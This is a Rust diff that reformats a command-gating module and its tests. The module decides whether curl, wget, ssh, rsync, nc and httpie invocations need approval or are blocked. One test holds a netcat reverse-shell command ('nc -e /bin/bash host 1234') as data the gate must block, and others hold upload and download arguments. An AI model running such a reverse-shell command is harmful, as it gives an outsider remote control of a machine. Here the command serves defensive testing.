@@ -92,10 +92,7 @@ fn check_curl(cmd: &CommandInfo) -> GateResult {
 
     // Non-GET methods
     let method_upper = method.to_uppercase();
-    if matches!(
-        method_upper.as_str(),
-        "POST" | "PUT" | "DELETE" | "PATCH"
-    ) {
+    if matches!(method_upper.as_str(), "POST" | "PUT" | "DELETE" | "PATCH") {
         return GateResult::ask(format!("curl: {method_upper} request"));
     }
 
@@ -134,7 +131,7 @@ fn check_wget(cmd: &CommandInfo) -> GateResult {
     for arg in args {
         match arg.as_str() {
             "-O" | "--output-document" | "-P" | "--directory-prefix" => {
-                return GateResult::ask("wget: Downloading file")
+                return GateResult::ask("wget: Downloading file");
             }
             "-r" | "--recursive" => return GateResult::ask("wget: Recursive download"),
             "-m" | "--mirror" => return GateResult::ask("wget: Mirroring site"),
@@ -263,9 +260,18 @@ mod tests {
                 (&["-X", "POST", "https://api.example.com"][..], "POST"),
                 (&["-X", "PUT", "https://api.example.com"], "PUT"),
                 (&["-X", "DELETE", "https://api.example.com"], "DELETE"),
-                (&["-d", "{\"key\":\"value\"}", "https://api.example.com"], "with data"),
-                (&["--data", "key=value", "https://api.example.com"], "with data"),
-                (&["-F", "file=@upload.txt", "https://api.example.com"], "with data"),
+                (
+                    &["-d", "{\"key\":\"value\"}", "https://api.example.com"],
+                    "with data",
+                ),
+                (
+                    &["--data", "key=value", "https://api.example.com"],
+                    "with data",
+                ),
+                (
+                    &["-F", "file=@upload.txt", "https://api.example.com"],
+                    "with data",
+                ),
                 (&["-o", "output.html", "https://example.com"], "Downloading"),
                 (&["-O", "https://example.com/file.zip"], "Downloading"),
             ];
@@ -273,7 +279,10 @@ mod tests {
             for (args, expected) in risky_cmds {
                 let result = check_network(&cmd("curl", args));
                 assert_eq!(result.decision, Decision::Ask, "Failed for: {args:?}");
-                assert!(result.reason.as_ref().unwrap().contains(expected), "Failed for: {args:?}");
+                assert!(
+                    result.reason.as_ref().unwrap().contains(expected),
+                    "Failed for: {args:?}"
+                );
             }
         }
     }
@@ -301,16 +310,25 @@ mod tests {
         fn test_risky_requests_ask() {
             let risky_cmds = [
                 (&["https://example.com"][..], "Downloading"),
-                (&["-O", "file.zip", "https://example.com/file.zip"], "Downloading"),
+                (
+                    &["-O", "file.zip", "https://example.com/file.zip"],
+                    "Downloading",
+                ),
                 (&["-r", "https://example.com"], "Recursive"),
                 (&["--mirror", "https://example.com"], "Mirroring"),
-                (&["--post-data", "key=value", "https://api.example.com"], "POST"),
+                (
+                    &["--post-data", "key=value", "https://api.example.com"],
+                    "POST",
+                ),
             ];
 
             for (args, expected) in risky_cmds {
                 let result = check_network(&cmd("wget", args));
                 assert_eq!(result.decision, Decision::Ask, "Failed for: {args:?}");
-                assert!(result.reason.as_ref().unwrap().contains(expected), "Failed for: {args:?}");
+                assert!(
+                    result.reason.as_ref().unwrap().contains(expected),
+                    "Failed for: {args:?}"
+                );
             }
         }
     }
@@ -331,7 +349,10 @@ mod tests {
             for (program, expected) in ssh_cmds {
                 let result = check_network(&cmd(program, &["user@host"]));
                 assert_eq!(result.decision, Decision::Ask, "Failed for: {program}");
-                assert!(result.reason.as_ref().unwrap().contains(expected), "Failed for: {program}");
+                assert!(
+                    result.reason.as_ref().unwrap().contains(expected),
+                    "Failed for: {program}"
+                );
             }
         }
 
@@ -345,7 +366,14 @@ mod tests {
         fn test_rsync_real_asks() {
             let result = check_network(&cmd("rsync", &["-av", "src/", "dest/"]));
             assert_eq!(result.decision, Decision::Ask);
-            assert!(result.reason.as_ref().unwrap().to_lowercase().contains("sync"));
+            assert!(
+                result
+                    .reason
+                    .as_ref()
+                    .unwrap()
+                    .to_lowercase()
+                    .contains("sync")
+            );
         }
     }
 
@@ -358,7 +386,14 @@ mod tests {
         fn test_nc_execute_blocks() {
             let result = check_network(&cmd("nc", &["-e", "/bin/bash", "host", "1234"]));
             assert_eq!(result.decision, Decision::Block);
-            assert!(result.reason.as_ref().unwrap().to_lowercase().contains("reverse shell"));
+            assert!(
+                result
+                    .reason
+                    .as_ref()
+                    .unwrap()
+                    .to_lowercase()
+                    .contains("reverse shell")
+            );
         }
 
         #[test]
@@ -401,7 +436,11 @@ mod tests {
             for program in ["http", "https", "xh"] {
                 for method in ["POST", "PUT", "DELETE", "PATCH"] {
                     let result = check_network(&cmd(program, &[method, "https://api.example.com"]));
-                    assert_eq!(result.decision, Decision::Ask, "Failed for: {program} {method}");
+                    assert_eq!(
+                        result.decision,
+                        Decision::Ask,
+                        "Failed for: {program} {method}"
+                    );
                     assert!(result.reason.as_ref().unwrap().contains(method));
                 }
             }
